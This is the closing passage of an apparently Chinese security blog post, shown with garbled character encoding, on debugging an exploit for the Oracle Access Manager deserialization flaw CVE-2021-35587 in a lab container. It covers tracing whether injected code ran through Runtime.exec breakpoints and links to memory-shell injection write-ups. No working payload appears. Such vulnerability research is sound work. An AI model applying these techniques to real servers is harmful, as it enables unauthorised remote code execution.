style=color:#e6db74>&#34;MD5&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>digest</span><span style=color:#f92672>(</span>constructor<span style=color:#f92672>.</span><span style=color:#a6e22e>m_definition</span><span style=color:#f92672>.</span><span style=color:#a6e22e>m_abClass</span><span style=color:#f92672>)).</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>(</span><span style=color:#ae81ff>16</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>new</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>math</span><span style=color:#f92672>.</span><span style=color:#a6e22e>BigInteger</span><span style=color:#f92672>(</span><span style=color:#ae81ff>1</span><span style=color:#f92672>,</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>MessageDigest</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getInstance</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;MD5&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>digest</span><span style=color:#f92672>(</span>abClass<span style=color:#f92672>)).</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>(</span><span style=color:#ae81ff>16</span><span style=color:#f92672>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=èƒ½ä»jvmå¸è½½ä¸€ä¸ªç±»åŠ è½½ä¸€ä¸ªç±»çš„æ–°ç‰ˆæœ¬å—>èƒ½ä»jvmå¸è½½ä¸€ä¸ªç±»/åŠ è½½ä¸€ä¸ªç±»çš„æ–°ç‰ˆæœ¬å—ï¼Ÿ<a hidden class=anchor aria-hidden=true href=#èƒ½ä»jvmå¸è½½ä¸€ä¸ªç±»åŠ è½½ä¸€ä¸ªç±»çš„æ–°ç‰ˆæœ¬å—>#</a></h2><p>ä¸è¡Œã€‚å‚è€ƒï¼š</p><blockquote><p>There is no way to force1 a class to unload. And unless the old class is unloaded, there is no way to load a new version of a class into the same classloader. (That is because the true identity of a class is a tuple comprising the fully qualified name of the class and the class loader identity.)</p><p>The solution is to load the new version of the class in a new classloader.</p><p>It is not clear if this will be practical for you, but unfortunately it is the only option available. The JVM does the &ldquo;duplicate class definition&rdquo; checks in a way that you can&rsquo;t subvert it. The check has security and JVM stability implications.</p><p>â€”â€”https://stackoverflow.com/questions/34414906/classloading-using-different-versions-of-the-same-class-java-lang-linkageerror</p></blockquote><h2 id=å¦‚ä½•çŸ¥é“æ¶æ„ä»£ç æ˜¯å¦è¢«æ‰§è¡Œäº†>å¦‚ä½•çŸ¥é“æ¶æ„ä»£ç æ˜¯å¦è¢«æ‰§è¡Œäº†ï¼Ÿ<a hidden class=anchor aria-hidden=true href=#å¦‚ä½•çŸ¥é“æ¶æ„ä»£ç æ˜¯å¦è¢«æ‰§è¡Œäº†>#</a></h2><p>æœ€å¼€å§‹æƒ³çš„æ˜¯åœ¨oammsä¸­æ–°å»ºæ–‡ä»¶ <code>/tmp/cve/12345.sh</code> ï¼Œåœ¨åºåˆ—åŒ–é™æ€æ–¹æ³•ä¸­æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œç„¶åç›‘æ§access timeï¼Œå¦‚æœæ”¹åŠ¨ï¼Œè¯´æ˜è°ƒç”¨åˆ°äº†å‘½ä»¤ã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-128-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-128-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-128-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-128-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-128-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-128-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ubuntu:~# docker exec -it oamms bash -c <span style=color:#e6db74>&#34;stat /tmp/cve/12345.sh&#34;</span> |grep <span style=color:#e6db74>&#34;Access: 2022&#34;</span> &gt;&gt; /tmp/touchflag.time
</span></span><span style=display:flex><span>root@ubuntu:~# cat /tmp/touchflag.time 
</span></span><span style=display:flex><span>Access: 2022-06-30 03:28:06.663982304 +0000
</span></span></code></pre></td></tr></table></div></div><p>ä½†å®é™…ä¸Šè¿™æ˜¯ä¸ªå‘ï¼ŒJavaä»£ç æ‰§è¡Œåˆ°è¿™ä¸ªæ–‡ä»¶ä¹Ÿä¸ä¼šæ”¹å˜statã€‚</p><p>æœ€å¥½æ˜¯æŒ‚ä¸Šè°ƒè¯•ï¼Œä¸‹åˆé€‚çš„æ–­ç‚¹ï¼Œæ‰§è¡Œæµæ˜¯å¦èµ°åˆ°æˆ‘ä»¬å…³å¿ƒçš„åœ°æ–¹å°±ä¸€æ¸…äºŒæ¥šäº†ã€‚</p><p>åœ¨æœ€ç»ˆçš„æ¶æ„ä»£ç ä¸­å¼¹è®¡ç®—å™¨ï¼Œç„¶åæŠŠæ–­ç‚¹ä¸‹åœ¨ <code>java.lang.Runtime#exec(java.lang.String)</code> æˆ–è€… <code>java.lang.Runtime#getRuntime()</code> ï¼Œå¯ä»¥éå¸¸æ¸…æ¥šçŸ¥é“é™æ€ä»£ç æœ‰æ²¡æœ‰è¢«æˆåŠŸæ‰§è¡Œï¼Œè¿˜èƒ½éå¸¸æ¸…æ™°åœ°æ‰“å‡ºæ•´ä¸ªè¿‡ç¨‹çš„è°ƒç”¨æ ˆã€‚</p><p><img loading=lazy src=image-20220630233819085.png alt=image-20220630233819085></p><p>java.lang.Runtime#exec(java.lang.String)</p><p><img loading=lazy src=image-20220630234020774.png alt=image-20220630234020774></p><h2 id=å¦‚ä½•ä¿æŒè‰¯å¥½çš„å¿ƒæ€>å¦‚ä½•ä¿æŒè‰¯å¥½çš„å¿ƒæ€ï¼Ÿ<a hidden class=anchor aria-hidden=true href=#å¦‚ä½•ä¿æŒè‰¯å¥½çš„å¿ƒæ€>#</a></h2><ul><li>ä¸è¦æ„¤æ€’ï¼Œä¸è¦ç€æ€¥ï¼Œåœ¨è®¡ç®—æœºä¸–ç•Œé‡Œé¢ï¼Œå¦‚æœå“ªé‡Œå‡ºé”™äº†ï¼Œé‚£ä¹ˆä¸€å®šæ˜¯ä½ å‡ºé”™äº†ï¼Œä¸ä¼šæ˜¯è®¡ç®—æœºã€‚</li></ul><h2 id=é—ç•™é—®é¢˜å¦‚ä½•è·Ÿè¸ªnativeè°ƒç”¨çš„è¿›å‡º>é—ç•™é—®é¢˜ï¼šå¦‚ä½•è·Ÿè¸ªnativeè°ƒç”¨çš„è¿›å‡ºï¼Ÿ<a hidden class=anchor aria-hidden=true href=#é—ç•™é—®é¢˜å¦‚ä½•è·Ÿè¸ªnativeè°ƒç”¨çš„è¿›å‡º>#</a></h2><p>åœ¨è¿›å…¥defineClassçš„rabbit hole çš„æ—¶å€™ï¼Œæˆ‘æ„è¯†åˆ°ï¼Œæœ‰äº›åœ°æ–¹ï¼Œå¦‚æœæ²¡æœ‰ä¸‹æ–­ç‚¹ï¼Œæ˜¯ä¼šç›´æ¥è·³è¿‡çš„ï¼ŒF7ä¹Ÿæ²¡æœ‰ç”¨ï¼Œå…³é—­ideaçš„smart step intoä¹Ÿæ²¡æœ‰ç”¨ã€‚æ¯”å¦‚nativeå‡½æ•°defineClass1è·³å‡ºæ¥åˆ°transformï¼Œåˆè·³å›å»ï¼Œç„¶ååˆå‡ºæ¥åˆ°RemotableSupportå¯¹è±¡çš„loadClassæ–¹æ³•ï¼Œå¦‚æœä¸æ˜¯æˆ‘æ ¹æ®é”™è¯¯å †æ ˆåœ¨è¿™é‡Œä¸‹æ–­ç‚¹ï¼Œå°±ä¼šç›´æ¥è·³èµ°ï¼Œæˆ‘å°±ä¸ä¼šè§‚å¯Ÿåˆ°è¿™ä¸ªç°è±¡ã€‚åˆæœ‰å¤šå°‘å› ä¸ºæˆ‘æ²¡æœ‰ä¸‹æ–­ç‚¹è€Œæ— æ³•è§‚å¯Ÿåˆ°çš„è¿‡ç¨‹å‘¢ï¼Ÿæ€ä¹ˆè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œåªæœ‰è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œæ‰èƒ½å®Œæ•´è·Ÿè¸ªåˆ°nativeå‡½æ•°å›è°ƒäº†å“ªäº›javaå±‚çš„å‡½æ•°ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼ŒåŠ¨æ€è°ƒè¯•æ—¶ï¼Œå½“æ‰§è¡Œæµè¿›å…¥nativeè°ƒç”¨å°±å®¹æ˜“è·Ÿä¸¢ï¼Œnativeè°ƒç”¨æ—¶è¿˜å¯èƒ½åœ¨Javaå’Œnativeä¹‹é—´åå¤è·³è½¬ï¼Œå¦‚æœæ²¡æœ‰åˆé€‚çš„æ–­ç‚¹ï¼Œå°±ä¼šé”™è¿‡å¾ˆå¤šé€»è¾‘ï¼Œæ˜¯å¦æœ‰ä»€ä¹ˆæ–¹å¼å¯ä»¥ç›‘æ§nativeè°ƒç”¨çš„è¿›å‡ºç‚¹ï¼Œç²¾å‡†åœ°ç›‘è§†è·³è½¬è¾¹ç•Œï¼Œå®Œæ•´åœ°è§‚å¯Ÿåˆ°nativeå±‚è°ƒç”¨è¿‡ç¨‹å’ŒJavaå±‚çš„äº¤äº’ã€‚è¿˜æ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆçš„åŠæ³•ï¼Œå¦‚æœæœ‰å¥½ä¸»æ„è¯·è”ç³»æˆ‘ã€‚</p><h1 id=æ‰©å±•é˜…è¯»>æ‰©å±•é˜…è¯»<a hidden class=anchor aria-hidden=true href=#æ‰©å±•é˜…è¯»>#</a></h1><ul><li>arthas<ul><li><a href=https://arthas.aliyun.com/doc/en/quick-start.html>https://arthas.aliyun.com/doc/en/quick-start.html</a></li></ul></li><li>å†…å­˜é©¬<ul><li><a href=https://www.cnblogs.com/bitterz/p/14970230.html>Weblogicä¸‹çš„servletå†…å­˜é©¬æ³¨å…¥-æ— å‚ç…§çº¯è°ƒè¯•</a></li><li><a href=https://myzxcg.com/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/#%E8%8E%B7%E5%8F%96webappservletcontext>Weblogic-å†…å­˜é©¬åˆ†æä¸å®ç°</a></li><li><a href=https://www.xuxblog.top/archives/java-dong-tai-jia-zai-zi-jie-ma-de-fang-fa>JavaåŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•</a></li></ul></li><li>å®‰è£…Oracle Access Manager<ul><li><a href=https://docs.oracle.com/en/middleware/idm/access-manager/12.2.1.4/tutorial-oam-docker/>Creating Oracle Access Management Docker Containers</a></li><li><a href=https://www.oracle.com/hk/security/identity-management/technologies/downloads/>https://www.oracle.com/hk/security/identity-management/technologies/downloads/</a></li><li><a href=https://docs.oracle.com/cd/E23104_01/download_readme.htm>https://docs.oracle.com/cd/E23104_01/download_readme.htm</a></li><li><a href=https://github.com/oracle/docker-images/tree/main/OracleAccessManagement>https://github.com/oracle/docker-images/tree/main/OracleAccessManagement</a></li><li>oracleè™šæ‹Ÿç¯å¢ƒï¼šhttps://www.oracle.com/virtualization/technologies/virtual-appliances.html</li></ul></li><li>CDBä¸PDB<ul><li><a href=https://www.cnblogs.com/kerrycode/p/3386917.html>ORACLE 12Cæ–°ç‰¹æ€§â€”â€”CDBä¸PDB</a></li><li><a href=https://www.dell.com/support/kbdoc/zh-cn/000146485/%E5%A6%82%E4%BD%95%E8%BF%9E%E6%8E%A5%E5%88%B0-oracle-rac-12cr1-%E4%B8%AD%E7%9A%84%E5%8F%AF%E6%8F%92%E6%8B%94%E6%95%B0%E6%8D%AE%E5%BA%93>å¦‚ä½•è¿æ¥åˆ° Oracle RAC 12cR1 ä¸­çš„å¯æ’æ‹”æ•°æ®åº“ï¼Ÿ</a></li></ul></li><li>SQLPLus<ul><li><a href=https://askubuntu.com/questions/159939/how-to-install-sqlplus>How to install SqlPlus?</a></li><li><a href=https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html>Oracle Instant Client Downloads for Linux x86-64 (64-bit)</a></li></ul></li><li>Oracleæ•°æ®åº“<ul><li><a href=https://hub.docker.com/u/findneo/content/sub-3762ef81-7448-4275-909b-df7e6b5d4070>Oracle Database Server Docker Image Documentation</a></li></ul></li><li>æ¼æ´åˆ†æ<ul><li><a href=https://twitter.com/testanull/status/1501567794022092805>https://twitter.com/testanull/status/1501567794022092805</a></li><li><a href=https://testbnull.medium.com/oracle-access-manager-pre-auth-rce-cve-2021-35587-analysis-1302a4542316>æ¼æ´ä½œè€…çš„åˆ†ææ–‡ç« </a></li><li><a href=https://mp.weixin.qq.com/s/nRZWYxUZRKeOX5hebRc7-Q>ã€æœ€æ–°æ¼æ´é¢„è­¦ã€‘CVE-2021â€“35587 Oracle Access Managerååºåˆ—åŒ–æ¼æ´åˆ†æä¸å‘½ä»¤å›æ˜¾æ„é€ </a></li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587</a></li></ul></li></ul></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://ret2neo.cn/post/220914-howto-name-tools/><span class=title>Â« Prev</span><br><span>è‡ªç ”å°å·¥å…·å¦‚ä½•å‘½å</span></a>
<a class=next href=https://ret2neo.cn/post/220317-howto-install-oracle-access-manager/><span class=title>Next Â»</span><br><span>å¦‚ä½•æ­å»º Oracle Access Manager</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://ret2neo.cn/>é—²è¨€è¯­</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2303473689051162" crossorigin=anonymous></script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>